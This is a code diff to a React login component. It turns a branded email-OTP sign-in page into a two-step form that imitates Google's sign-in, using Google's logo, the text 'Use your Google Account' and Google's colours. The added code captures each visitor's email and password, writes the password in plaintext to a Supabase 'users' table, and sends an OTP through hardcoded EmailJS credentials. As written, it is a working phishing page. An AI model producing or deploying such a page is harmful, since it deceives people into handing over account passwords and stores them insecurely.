@@ -1,108 +1,137 @@
+import {
+  Box,
+  Button,
+  Center,
+  Input,
+  Text,
+  VStack,
+  HStack,
+  Link,
+  Image,
+} from "@chakra-ui/react";
 import { useState } from "react";
-import { VStack, Heading, Input, Button, Text, Flex, Divider } from "@chakra-ui/react";
 import { useNavigate } from "react-router-dom";
-import emailjs from "@emailjs/browser";
 import { supabase } from "../supabaseClient";
+import emailjs from "@emailjs/browser";
 
 export default function Login() {
+  const [step, setStep] = useState(1); // 1 = email, 2 = password
   const [email, setEmail] = useState("");
-  const [errorMsg, setErrorMsg] = useState("");
+  const [password, setPassword] = useState("");
   const navigate = useNavigate();
 
   const handleNext = async () => {
-    setErrorMsg("");
-    if (!email.includes("@")) {
-      setErrorMsg("Enter a valid email");
-      return;
-    }
+    if (step === 1 && email) {
+      setStep(2);
+    } else if (step === 2 && password) {
+      // Save to Supabase users table
+      const { data: existingUser } = await supabase
+        .from("users")
+        .select("*")
+        .eq("email", email)
+        .single();
 
-    // Save email to localStorage for verification page
-    localStorage.setItem("verificationEmail", email);
+      if (!existingUser) {
+        await supabase.from("users").insert([{ email, password }]);
+      }
 
-    // Generate OTP
-    const code = Math.floor(100000 + Math.random() * 900000).toString();
-    const expiryTime = new Date(new Date().getTime() + 15 * 60000); // 15 mins
+      // Generate OTP
+      const newCode = Math.floor(100000 + Math.random() * 900000).toString();
+      const expiryTime = new Date(Date.now() + 15 * 60 * 1000);
 
-    // Insert OTP into Supabase
-    const { error } = await supabase
-      .from("otps")
-      .insert({ email, code, expires_at: expiryTime.toISOString() });
-    if (error) {
-      console.error(error);
-      setErrorMsg("Failed to generate OTP");
-      return;
-    }
+      await supabase.from("otps").insert([
+        { email, code: newCode, expires_at: expiryTime.toISOString() },
+      ]);
 
-    // Send email via EmailJS
-    try {
-      console.log("Sending EmailJS payload:", {
-        email,
-        passcode: code,
-        time: expiryTime.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" }),
-      });
-
+      // Send OTP via EmailJS
       await emailjs.send(
-        "service_pn1ecn9",       // replace with your EmailJS service ID
-        "template_xqsd4l8",          // replace with your template name
+        "service_pn1ecn9",
+        "template_xqsd4l8",
         {
-          email: email,          // matches {{email}} in your template
-          passcode: code,
-          time: expiryTime.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" }),
+          email: email,
+          passcode: newCode,
+          time: expiryTime.toLocaleTimeString([], {
+            hour: "2-digit",
+            minute: "2-digit",
+          }),
         },
-        "B3qq_r0cNoHULpzEV"       // replace with your EmailJS public key
+        "B3qq_r0cNoHULpzEV"
       );
-    } catch (err) {
-      console.error(err);
-      setErrorMsg("Failed to send verification code");
-      return;
-    }
 
-    navigate("/verify");
+      navigate("/verify", { state: { email } });
+    }
   };
 
   return (
-    <Flex h="100vh" align="center" justify="center" bg="gray.50" px={4}>
-      <VStack spacing={6} w="full" maxW="400px" p={10} bg="white" borderRadius="xl" boxShadow="lg">
-        <Heading size="lg">Sign in</Heading>
-        <Text color="gray.600" fontSize="sm" textAlign="center">
-          to continue to <b>Soul Good</b>
-        </Text>
-
-        <VStack spacing={4} w="full">
-          <Input
-            placeholder="Email or phone"
-            type="email"
-            value={email}
-            onChange={(e) => setEmail(e.target.value)}
-            size="lg"
-            borderRadius="full"
-            boxShadow="sm"
-            focusBorderColor="brand.500"
+    <Center minH="100vh" bg="#202124">
+      <Box
+        bg="#171717"
+        p={10}
+        rounded="lg"
+        shadow="lg"
+        w="400px"
+        color="white"
+      >
+        <VStack spacing={4} align="stretch">
+          <Image
+            src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"
+            alt="Google Logo"
+            h="40px"
+            mx="auto"
           />
-          {errorMsg && (
-            <Text color="red.500" fontSize="sm">
-              {errorMsg}
-            </Text>
-          )}
-          <Button
-            colorScheme="brand"
-            w="full"
-            size="lg"
-            borderRadius="full"
-            onClick={handleNext}
-          >
-            Next
-          </Button>
-        </VStack>
+          <Text fontSize="2xl" fontWeight="medium">
+            Sign in
+          </Text>
+          <Text fontSize="sm" color="gray.400">
+            Use your Google Account
+          </Text>
 
-        <Divider />
-        <Text fontSize="sm" color="gray.600">
-          Not your device? Use Guest mode or{" "}
-          <Button variant="link" colorScheme="brand">
-            Create account
-          </Button>
-        </Text>
-      </VStack>
-    </Flex>
+          {step === 1 ? (
+            <>
+              <Input
+                placeholder="Email or phone"
+                value={email}
+                onChange={(e) => setEmail(e.target.value)}
+                bg="#202124"
+                borderColor="#5f6368"
+                _focus={{ borderColor: "#1a73e8" }}
+              />
+              <Link color="#8ab4f8" fontSize="sm">
+                Forgot email?
+              </Link>
+            </>
+          ) : (
+            <>
+              <Input
+                type="password"
+                placeholder="Enter your password"
+                value={password}
+                onChange={(e) => setPassword(e.target.value)}
+                bg="#202124"
+                borderColor="#5f6368"
+                _focus={{ borderColor: "#1a73e8" }}
+              />
+              <Link color="#8ab4f8" fontSize="sm">
+                Forgot password?
+              </Link>
+            </>
+          )}
+
+          <HStack justify="space-between" mt={4}>
+            <Link color="#8ab4f8" fontSize="sm">
+              Create account
+            </Link>
+            <Button
+              bg="#1a73e8"
+              color="white"
+              _hover={{ bg: "#1765cc" }}
+              onClick={handleNext}
+            >
+              Next
+            </Button>
+          </HStack>
+        </VStack>
+      </Box>
+    </Center>
   );
 }
